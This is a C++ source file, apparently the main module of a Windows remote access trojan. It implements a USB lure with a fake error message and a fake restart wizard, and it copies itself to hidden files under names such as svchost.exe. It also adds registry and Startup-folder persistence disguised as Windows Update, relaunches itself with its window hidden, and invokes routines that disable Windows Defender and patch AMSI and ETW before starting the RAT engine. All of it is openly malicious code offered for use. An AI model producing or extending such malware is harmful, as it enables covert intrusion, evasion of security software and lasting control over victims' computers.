#include "rat_engine.h"
#include "../utils/logger.h"
#include "../stealth/defender_bypass.h"
#include "../lure/restart_wizard.h"
#include <windows.h>
#include <thread>
#include <chrono>
#include <vector>
#include <string>
#include <fstream>

// Forward declarations
void CopyToVictimSystem();
void AddToStartup(const std::string& exePath);
void RunRATStealth();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window (if any)
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    Logger::getInstance().log("=== RAT Starting ===");
    
    // ============================================
    // STEP 1: Check if running from USB (LURE PHASE)
    // ============================================
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    std::string exePath = currentPath;
    
    // Check if running from USB (drive D:, E:, F:, etc.)
    if (exePath.length() > 0 && exePath[0] >= 'D' && exePath[0] <= 'Z') {
        Logger::getInstance().log("[*] Running from USB drive. Starting lure...");
        
        // Create legitimate-looking folders if not exists
        CreateDirectoryA("ImportantDocuments", NULL);
        CreateDirectoryA("SoftwareDiamondsGenerator", NULL);
        
        // Display the fake error first
        MessageBoxA(NULL, 
            "Cannot open this folder. The directory structure may be corrupted.\n\n"
            "The system will now attempt to repair the installation.",
            "Error Opening Folder",
            MB_OK | MB_ICONERROR);
        
        Logger::getInstance().log("[*] Fake error shown to user.");
        
        // Silently copy to victim machine
        CopyToVictimSystem();
        
        // Show the restart wizard
        Logger::getInstance().log("[*] Showing restart wizard...");
        ShowRestartWizard();
        
        // Run the REAL RAT in the background after wizard closes
        RunRATStealth();
        
        // Exit immediately (the RAT will continue in background)
        return 0;
    }
    
    // ============================================
    // STEP 2: Windows Defender Bypass (if not from USB)
    // ============================================
    Logger::getInstance().log("[*] Initializing Defender bypass...");
    
    DefenderBypass* defender = new DefenderBypass();
    
    if (!defender->IsAdmin()) {
        Logger::getInstance().log("[!] Not running as administrator. Attempting elevation...");
    }
    
    Logger::getInstance().log("[*] Bypassing Windows Defender...");
    bool bypass_success = defender->DisableAllProtections();
    
    if (bypass_success) {
        Logger::getInstance().log("[+] Windows Defender disabled successfully!");
        defender->AddSelfExclusion();
        defender->KillDefenderProcesses();
        defender->BypassAMSI("All AMSI calls");
        defender->PatchETW();
        Logger::getInstance().log("[+] All security measures bypassed.");
    } else {
        Logger::getInstance().log("[!] Failed to bypass some protections.");
    }
    
    // ============================================
    // STEP 3: Start RAT Engine
    // ============================================
    Logger::getInstance().log("[*] Starting RAT engine...");
    
    RATEngine engine;
    if (engine.start()) {
        Logger::getInstance().log("[+] RAT engine started successfully.");
        
        MSG msg;
        while (engine.is_running() && GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    } else {
        Logger::getInstance().log("[!] Failed to start RAT engine.");
    }
    
    // ============================================
    // STEP 4: Cleanup and Restore
    // ============================================
    Logger::getInstance().log("[*] Shutting down RAT...");
    
    if (defender) {
        Logger::getInstance().log("[*] Restoring Windows Defender...");
        defender->EnableAllProtections();
        defender->StartDefenderServices();
        delete defender;
    }
    
    Logger::getInstance().log("[+] Cleanup complete.");
    Logger::getInstance().log("=== RAT Shutting Down ===");
    
    return 0;
}

// ... rest of your functions (CopyToVictimSystem, AddToStartup, RunRATStealth)

// ============================================
// USB LURE FUNCTIONS
// ============================================

void CopyToVictimSystem() {
    // Get current executable path
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    
    Logger::getInstance().log("[*] Copying to victim system...");
    
    // Target paths (multiple persistence mechanisms)
    std::vector<std::string> targetPaths = {
        // Startup folder
        std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe",
        
        // Windows Temp folder
        std::string(getenv("TEMP")) + "\\winupdate.exe",
        
        // User profile
        std::string(getenv("USERPROFILE")) + "\\Documents\\rat.exe"
    };
    
    // Try each target path
    for (const auto& target : targetPaths) {
        if (CopyFileA(currentPath, target.c_str(), FALSE)) {
            Logger::getInstance().log("[+] Copied to: " + target);
            
            // Hide the file
            SetFileAttributesA(target.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            
            // Add to startup
            AddToStartup(target);
            
            break;
        }
    }
}

void AddToStartup(const std::string& exePath) {
    // Registry persistence
    HKEY hKey;
    std::string regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Use a name that looks legitimate
        std::string valueName = "WindowsUpdateService";
        
        if (RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ, 
                          (BYTE*)exePath.c_str(), exePath.length() + 1) == ERROR_SUCCESS) {
            Logger::getInstance().log("[+] Added to startup registry: " + valueName);
        }
        RegCloseKey(hKey);
    }
    
    // Also add to startup folder as backup
    std::string startupFolder = std::string(getenv("APPDATA")) + 
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
    std::string shortcutPath = startupFolder + "WindowsUpdate.lnk";
    
    // Create a shortcut (simplified - just copy the file directly)
    CopyFileA(exePath.c_str(), shortcutPath.c_str(), FALSE);
    SetFileAttributesA(shortcutPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    
    Logger::getInstance().log("[+] Added to startup folder.");
}

void RunRATStealth() {
    Logger::getInstance().log("[*] Running RAT in stealth mode...");
    
    // Create a new process with hidden window
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    
    // Run the RAT again but with a different command line to indicate stealth mode
    std::string cmd = std::string(currentPath) + " --stealth";
    
    if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        Logger::getInstance().log("[+] RAT running in stealth mode.");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        Logger::getInstance().log("[!] Failed to run RAT in stealth mode.");
    }
}
